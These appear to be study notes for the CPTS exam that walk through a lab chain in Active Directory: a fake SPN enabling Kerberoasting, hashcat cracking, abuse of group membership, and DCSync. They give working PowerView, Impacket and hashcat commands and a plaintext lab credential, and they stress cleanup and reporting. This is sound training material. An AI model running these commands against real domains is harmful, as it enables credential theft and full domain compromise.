## 1. Overall Attack Chain

The entire section demonstrates how several **Active Directory misconfigurations/permissions can be chained together** to move from an already-compromised account toward **Domain Controller credential extraction**.

### Attack chain

```
mssqladm credentials
       │
       ▼
GenericWrite over ttimmons
       │
       ▼
Add fake SPN to ttimmons
       │
       ▼
Targeted Kerberoasting
       │
       ▼
Obtain TGS hash
       │
       ▼
Offline password cracking
       │
       ▼
Recover ttimmons credentials
       │
       ▼
GenericAll over SERVER ADMINS
       │
       ▼
Add ttimmons to SERVER ADMINS
       │
       ▼
Inherit DCSync privileges
       │
       ▼
secretsdump / DCSync
       │
       ▼
NTLM hashes from Domain Controller
```

**The key lesson:** an account does not necessarily need to be a Domain Admin initially. **Dangerous ACL relationships can allow privilege escalation when chained together.**

---

# 2. Initial Credentials

The previous enumeration resulted in the following credential pair:

```
mssqladm:DBAilfreight1!
```

The important point is not simply that we obtained credentials, but **what those credentials can control in Active Directory**.

BloodHound showed:

```
MSSQLADM
    │
    │ GenericWrite
    ▼
TTIMMONS
```

This is important because `GenericWrite` allows modification of attributes on the target object. In this scenario, that ability can be abused to add a **Service Principal Name (SPN)** to `ttimmons`.

The uploaded material specifically identifies this as the path to a **targeted Kerberoasting attack**. Pasted markdown

---

# 3. Understanding GenericWrite

## What is GenericWrite?

`GenericWrite` is an Active Directory permission that allows the holder to modify certain attributes of another AD object.

In this scenario:

```
mssqladm
    ↓
GenericWrite
    ↓
ttimmons
```

The important abuse is:

```
GenericWrite
     ↓
Modify ttimmons
     ↓
Add an SPN
     ↓
Make ttimmons Kerberoastable
```

### Important

The target account does **not necessarily need to have originally been configured as a service account**.

Because we have the ability to modify the account's attributes, we can add a fake SPN.

---

# 4. Creating a PSCredential Object

The material returns to the `DEV01` machine where PowerView was already loaded.

Instead of repeatedly logging in through RDP, a PowerShell `PSCredential` object is created.

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(
    'INLANEFREIGHT\mssqladm',
    $SecPassword
)
```

Source: Pasted markdown

---

## What is happening here?

### Step 1

```
ConvertTo-SecureString
```

Converts the plaintext password into a PowerShell `SecureString`.

### Step 2

```
New-Object System.Management.Automation.PSCredential
```

Creates a credential object containing:

```
Username:
INLANEFREIGHT\mssqladm

Password:
DBAilfreight1!
```

### Why?

This allows PowerView commands to authenticate using the `mssqladm` credentials without needing another interactive login.

---

# 5. Adding a Fake SPN

The next step uses PowerView's:

```
Set-DomainObject
```

The material creates an SPN:

```
acmetesting/LEGIT
```

and assigns it to:

```
ttimmons
```

Command:

```
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

Source: Pasted markdown

---

## What is an SPN?

**SPN = Service Principal Name**

An SPN identifies a service instance in Active Directory for Kerberos authentication.

A simplified example:

```
MSSQLSvc/sql01.domain.local:1433
```

could represent a SQL Server service.

Kerberos can issue a **TGS (Ticket Granting Service ticket)** for an SPN.

---

# 6. Why the Fake SPN Matters

Normally, Kerberoasting targets accounts associated with SPNs.

Here, we deliberately create one:

```
ttimmons
     │
     ▼
servicePrincipalName
     │
     ▼
acmetesting/LEGIT
```

This makes the account suitable for the targeted Kerberoasting technique demonstrated in the lab.

### Important report-writing point

The source explicitly says that the fake SPN should be **deleted later** and the change should be documented in the report appendices. Pasted markdown

This is extremely important during a real penetration test:

> **If you modify an AD object, document the modification and restore the original configuration.**

---

# 7. Targeted Kerberoasting

Once the SPN exists, the attack host can request the Kerberos service ticket.

The material uses:

```
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

Source: Pasted markdown

---

## Breaking down the command

### `proxychains`

Routes the traffic through the configured proxy chain.

```
proxychains
```

### `GetUserSPNs.py`

An Impacket utility used for querying/requesting Kerberos service tickets associated with SPNs.

### `-dc-ip`

Specifies the Domain Controller:

```
172.16.8.3
```

### Domain/user

```
INLANEFREIGHT.LOCAL/mssqladm
```

This tells the tool which domain and authenticated user are being used.

### `-request-user ttimmons`

Instead of requesting tickets broadly, the operation specifically targets:

```
ttimmons
```

---

# 8. The Result

The output shows:

```
ServicePrincipalName    Name
--------------------    --------
acmetesting/LEGIT       ttimmons
```

This confirms that the fake SPN was successfully associated with `ttimmons`.

The tool then obtains a Kerberos TGS response.

The important portion begins with:

```
$krb5tgs$23$*ttimmons$...
```

This is the **Kerberos 5 TGS-REP hash format** used for offline password cracking.

---

# 9. Kerberoasting — The Concept

The basic concept is:

```
Authenticated Domain User
          │
          │ Request TGS
          ▼
     Domain Controller
          │
          │ TGS-REP
          ▼
Encrypted service ticket
          │
          ▼
      Offline cracking
          │
          ▼
Service account password
```

The important advantage from an attacker's perspective is that password guessing can be performed **offline** against the obtained ticket rather than repeatedly authenticating against the Domain Controller.

HTB's material also describes Kerberoasting as a technique that can be abused for lateral movement and privilege escalation. [HTB Academy](https://academy.hackthebox.com/course/preview/kerberos-attacks?utm_source=chatgpt.com)

---

# 10. Cracking the TGS Hash

The next step uses Hashcat:

```
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

Source: Pasted markdown

---

## Important Hashcat option

```
-m 13100
```

represents:

```
Kerberos 5, etype 23, TGS-REP
```

The supplied output explicitly confirms:

```
Hash.Name........: Kerberos 5, etype 23, TGS-REP
```

and:

```
Status...........: Cracked
```

Source: Pasted markdown

---

# 11. Why the Password Was Crackable

The password was weak enough to be recovered using:

```
/usr/share/wordlists/rockyou.txt
```

The important security lesson is:

> **A Kerberoastable account with a weak password can become a major escalation point.**

The source specifically notes that the cracking succeeded and resulted in another credential pair. Pasted markdown

---

# 12. Second BloodHound Discovery

After compromising `ttimmons`, BloodHound is checked again.

This reveals:

```
TTIMMONS
    │
    │ GenericAll
    ▼
SERVER ADMINS
```

Source: Pasted markdown

---

# 13. Understanding GenericAll

`GenericAll` is a highly powerful permission.

Conceptually:

```
GenericAll
    =
Very broad control over the target object
```

In this case, the target is:

```
SERVER ADMINS
```

Therefore, `ttimmons` can manipulate the group.

The important consequence is:

```
ttimmons
    ↓
GenericAll
    ↓
SERVER ADMINS
    ↓
DCSync privileges
```

---

# 14. Why SERVER ADMINS Is Important

BloodHound shows that the:

```
SERVER ADMINS
```

group has permissions associated with directory replication:

```
GetChanges
GetChangesAll
```

These permissions are what make the group capable of performing a **DCSync-style credential extraction**.

Source: Pasted markdown

---

# 15. DCSync — Core Concept

DCSync abuses legitimate Active Directory replication functionality.

Conceptually:

```
Attacker-controlled account
          │
          │ Replication request
          ▼
     Domain Controller
          │
          │ Directory replication data
          ▼
 NTLM password hashes
```

The key idea:

**The attacker does not need to directly read `NTDS.dit` from the Domain Controller.**

Instead, an account with sufficient replication rights can request directory data through the replication protocol.

---

# 16. Creating Credentials for TTIMMONS

The material creates another PowerShell credential object:

```
$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force

$timcreds = New-Object System.Management.Automation.PSCredential(
    'INLANEFREIGHT\ttimmons',
    $timpass
)
```

Source: Pasted markdown

This credential object will be used to perform the group-membership modification.

---

# 17. Adding TTIMMONS to SERVER ADMINS

First, the group SID is obtained:

```
$group = Convert-NameToSid "Server Admins"
```

Then:

```
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

Source: Pasted markdown

The result is essentially:

```
ttimmons
    ↓
added to
    ↓
SERVER ADMINS
```

Once membership is changed, `ttimmons` inherits the privileges assigned to the group.

---

# 18. Privilege Escalation Chain

This is one of the **most important things to memorize** from this section:

```
mssqladm
   │
   │ GenericWrite
   ▼
ttimmons
   │
   │ Fake SPN
   ▼
Targeted Kerberoasting
   │
   ▼
Cracked password
   │
   ▼
ttimmons
   │
   │ GenericAll
   ▼
SERVER ADMINS
   │
   │ GetChanges + GetChangesAll
   ▼
DCSync
   │
   ▼
NTLM hashes
```

### Exam/interview explanation

If someone asks:

> **"How did you go from mssqladm to domain credential hashes?"**

A concise answer would be:

> We identified that `mssqladm` had `GenericWrite` over `ttimmons`. We abused that permission to add a controlled SPN to `ttimmons`, requested a TGS ticket, and cracked it offline to recover the user's password. BloodHound then showed that `ttimmons` had `GenericAll` over the `SERVER ADMINS` group. We added `ttimmons` to that group, which granted the required directory replication permissions, allowing a DCSync operation to retrieve NTLM hashes from the Domain Controller.

---

# 19. Performing DCSync

The material then uses:

```
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

Source: Pasted markdown

---

## Breaking it down

### `proxychains`

Routes the connection through the configured proxy chain.

### `secretsdump.py`

Impacket tool capable of extracting various Windows/AD secrets when the supplied credentials have sufficient privileges.

### Target

```
ttimmons@172.16.8.3
```

The target is the Domain Controller.

### `-just-dc-ntlm`

Specifies that the operation should retrieve NTLM password hashes from the Domain Controller.

---

# 20. DCSync Output

The output begins with:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
```

and:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

Source: Pasted markdown

The output contains accounts such as:

```
Administrator
Guest
krbtgt
inlanefreight.local\avazquez
inlanefreight.local\pfalcon
...
```

The important thing is that the operation has successfully obtained **NTLM password hashes for domain accounts**.

---

# 21. Understanding the Hash Output

A typical line has a structure similar to:

```
username:RID:LMHASH:NTHASH:::
```

For example:

```
Administrator:500:LMHASH:NTHASH:::
```

### Components

|Component|Meaning|
|---|---|
|Username|Account name|
|RID|Relative Identifier|
|LM Hash|Legacy password hash field|
|NT Hash|NTLM password hash|
|Remaining fields|Additional SAM/credential fields|

In modern environments, the LM hash field is frequently represented by the well-known disabled/empty LM value, while the NT hash remains the important credential material.

---

# 22. Why DCSync Is Critical

Once an attacker can perform DCSync, the compromise can become **domain-wide**.

Potentially exposed accounts include:

```
Administrator
krbtgt
Domain users
Service accounts
Privileged accounts
```

The source specifically recommends considering the security implications of obtaining the entire NTDS database and performing offline password-strength analysis during an authorized penetration test. Pasted markdown

---

# 23. What Is `krbtgt`?

One particularly important account in the output is:

```
krbtgt
```

This account is fundamental to Kerberos authentication within the domain.

Therefore:

```
krbtgt compromise
        ↓
Kerberos trust material compromised
        ↓
Potential severe domain-wide impact
```

For a penetration test, the presence of its hash should be treated as highly sensitive evidence.

---

# 24. The Difference Between Kerberoasting and DCSync

|Feature|Kerberoasting|DCSync|
|---|---|---|
|Main target|Kerberos service account|AD directory credentials|
|Main requirement|Obtain/request service ticket|Replication privileges|
|Important AD object|SPN|Domain replication permissions|
|Output|TGS hash|NTLM hashes|
|Cracking|Offline|May not require cracking immediately|
|Main abuse|Weak service-account password|Excessive replication rights|
|Example tool|`GetUserSPNs.py`|`secretsdump.py`|
|In this lab|`ttimmons`|Domain accounts|

### Easy memory trick

```
Kerberoasting
     ↓
TGS
     ↓
Crack password

DCSync
     ↓
Replication
     ↓
NTLM hashes
```

---

# 25. BloodHound — Why It Was So Important

BloodHound is essentially the **relationship map** that revealed the attack chain.

The important relationships were:

### Relationship 1

```
MSSQLADM
   │
   └── GenericWrite ──► TTIMMONS
```

### Relationship 2

```
TTIMMONS
   │
   └── GenericAll ──► SERVER ADMINS
```

### Relationship 3

```
SERVER ADMINS
   │
   ├── GetChanges
   └── GetChangesAll
             │
             ▼
          DOMAIN
```

### Therefore

```
MSSQLADM
   ↓
TTIMMONS
   ↓
SERVER ADMINS
   ↓
DCSync
```

**This is exactly why ACL enumeration is so important during an AD penetration test.**

---

# 26. Important PowerView Commands

### Create credentials

```
$SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(
    'DOMAIN\USER',
    $SecPassword
)
```

### Modify domain object

```
Set-DomainObject
```

### Add group member

```
Add-DomainGroupMember
```

### Convert group name to SID

```
Convert-NameToSid
```

---

# 27. Important Impacket Commands

### Request targeted SPN ticket

```
proxychains GetUserSPNs.py -dc-ip <DC-IP> DOMAIN/USER -request-user <TARGET>
```

### DCSync / credential extraction

```
proxychains secretsdump.py USER@<DC-IP> -just-dc-ntlm
```

---

# 28. Important Hashcat Command

```
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

### Remember

```
13100 = Kerberos 5 TGS-REP / etype 23
```

---

# 29. Reporting the Attack

This part of the source is **extremely important for your CPTS reporting practice**.

The source recommends documenting **all steps** and suggests several forms of evidence after reaching a high-privilege position. Pasted markdown

A professional report should contain:

### 1. Initial access

Document:

```
Credential obtained:
mssqladm:DBAilfreight1!
```

### 2. BloodHound evidence

Show:

```
mssqladm → GenericWrite → ttimmons
```

### 3. SPN modification

Document:

```
Original configuration
        ↓
Fake SPN added
        ↓
Kerberoasting performed
        ↓
SPN removed
```

### 4. Kerberoasting evidence

Include:

```
GetUserSPNs.py output
```

### 5. Cracking evidence

Include:

```
Hashcat output
Status: Cracked
```

Do **not** expose unnecessary plaintext credentials in the client-facing report.

---

# 30. DCSync Evidence

Document:

```
ttimmons
   ↓
SERVER ADMINS
   ↓
GetChanges
GetChangesAll
   ↓
DCSync
```

Then include appropriate evidence from:

```
secretsdump.py
```

Again, sensitive hashes should be handled carefully in the actual report.

---

# 31. Proving Domain-Level Access

The source suggests that showing actual access can be more convincing to a client than simply presenting raw `secretsdump` output. Pasted markdown

For example, after authorized access to a Domain Controller, evidence could include:

```
hostname
```

```
whoami
```

```
ipconfig /all
```

A screenshot showing these commands can provide strong visual evidence.

---

# 32. Post-Domain-Admin Assessment

Getting Domain Admin should **not necessarily be the end of a professional assessment**.

The source recommends considering:

### Additional AD auditing

```
Domain configuration
Trust relationships
Privileged groups
ACLs
Delegation
Authentication controls
```

### Domain and forest trusts

If they are explicitly within scope:

```
Domain A
   │
   └── Trust
        │
        ▼
     Domain B
```

These relationships may introduce additional attack paths.

---

# 33. Testing Detection and Alerting

Another very valuable part of the source is testing whether the client detects changes to highly privileged groups.

For example, in an authorized engagement, testers may test whether security monitoring detects:

```
New Domain Admin
New Enterprise Admin
Unauthorized privileged-group membership
```

The source emphasizes that such changes should be properly documented as configuration changes in the appendices. Pasted markdown

---

# 34. Don't Forget the Good Findings

This is an excellent **professional pentesting/report-writing lesson**.

The source says that if the client detects your privileged-group modification and responds appropriately, you should give them credit for it.

So your report should not be:

> "Everything is broken."

Instead:

### Findings

```
Critical
High
Medium
Low
Informational
```

### Positive observations

```
✓ Privileged group monitoring detected the test
✓ SOC responded to the event
✓ Account was removed automatically
✓ Alerts were generated
✓ Security controls prevented further exploitation
```

This gives the client a balanced and professional assessment.

---

# 35. Complete Attack Flow — Memorize This

```
                  ┌─────────────────┐
                  │    MSSQLADM     │
                  └────────┬────────┘
                           │
                      GenericWrite
                           │
                           ▼
                  ┌─────────────────┐
                  │    TTIMMONS     │
                  └────────┬────────┘
                           │
                     Fake SPN
                           │
                           ▼
                  ┌─────────────────┐
                  │ Kerberoasting   │
                  └────────┬────────┘
                           │
                        TGS Hash
                           │
                           ▼
                  ┌─────────────────┐
                  │    Hashcat      │
                  └────────┬────────┘
                           │
                    Password cracked
                           │
                           ▼
                  ┌─────────────────┐
                  │    TTIMMONS     │
                  └────────┬────────┘
                           │
                       GenericAll
                           │
                           ▼
                  ┌─────────────────┐
                  │ SERVER ADMINS   │
                  └────────┬────────┘
                           │
                 GetChanges +
                 GetChangesAll
                           │
                           ▼
                  ┌─────────────────┐
                  │     DCSync      │
                  └────────┬────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │  NTLM Hashes    │
                  │ Domain Accounts │
                  └─────────────────┘
```

---

# 36. CPTS / Interview Quick Revision

### Q1. What is GenericWrite?

> An AD permission that allows modification of attributes on a target object.

### Q2. How was GenericWrite abused here?

> It was used to add a fake SPN to `ttimmons`, enabling targeted Kerberoasting.

### Q3. What is an SPN?

> A Service Principal Name identifies a service instance for Kerberos authentication.

### Q4. What does Kerberoasting obtain?

> A Kerberos TGS response that can be subjected to offline password cracking.

### Q5. What Hashcat mode was used?

```
13100
```

### Q6. What did BloodHound reveal after compromising `ttimmons`?

```
GenericAll → SERVER ADMINS
```

### Q7. Why is SERVER ADMINS important?

> It had the required directory replication permissions for DCSync.

### Q8. What permissions are highlighted?

```
GetChanges
GetChangesAll
```

### Q9. What does DCSync abuse?

> Active Directory replication functionality to obtain directory credential material.

### Q10. What tool was used?

```
secretsdump.py
```

### Q11. What was extracted?

> NTLM password hashes for domain accounts.

### Q12. What is the complete chain?

```
GenericWrite
     ↓
Fake SPN
     ↓
Kerberoasting
     ↓
Password cracking
     ↓
GenericAll
     ↓
Privileged group membership
     ↓
Replication rights
     ↓
DCSync
     ↓
NTLM hashes
```

---

# 37. Most Important Things to Remember ⭐

If you're preparing for **CPTS**, memorize these points first:

### ⭐ 1. BloodHound is about relationships

Don't just look for:

```
Domain Admin
```

Look for:

```
GenericWrite
GenericAll
WriteDACL
AddMember
ForceChangePassword
GetChanges
GetChangesAll
```

---

### ⭐ 2. GenericWrite → SPN → Kerberoasting

```
GenericWrite
     ↓
Modify target
     ↓
Add SPN
     ↓
Request TGS
     ↓
Crack offline
```

---

### ⭐ 3. GenericAll over a group can be extremely dangerous

```
GenericAll
     ↓
Group manipulation
     ↓
Privilege inheritance
```

---

### ⭐ 4. DCSync is about replication

Remember:

```
GetChanges
+
GetChangesAll
=
Potential DCSync capability
```

---

### ⭐ 5. Kerberoasting ≠ DCSync

```
Kerberoasting → TGS → password cracking

DCSync → replication → NTLM hashes
```

---

### ⭐ 6. Always clean up

If you create:

```
Fake SPN
```

remove it.

If you add:

```
Test account → privileged group
```

remove it.

And **document the changes in the report appendix**.

---

### ⭐ 7. Evidence matters

For CPTS/reporting, don't just say:

> "I compromised the domain."

Show the chain:

```
Initial credential
      ↓
BloodHound relationship
      ↓
Exploitation
      ↓
Credential recovery
      ↓
Privilege escalation
      ↓
DCSync evidence
      ↓
Impact
      ↓
Remediation
```

That is the difference between a **walkthrough** and a **professional penetration-test report**.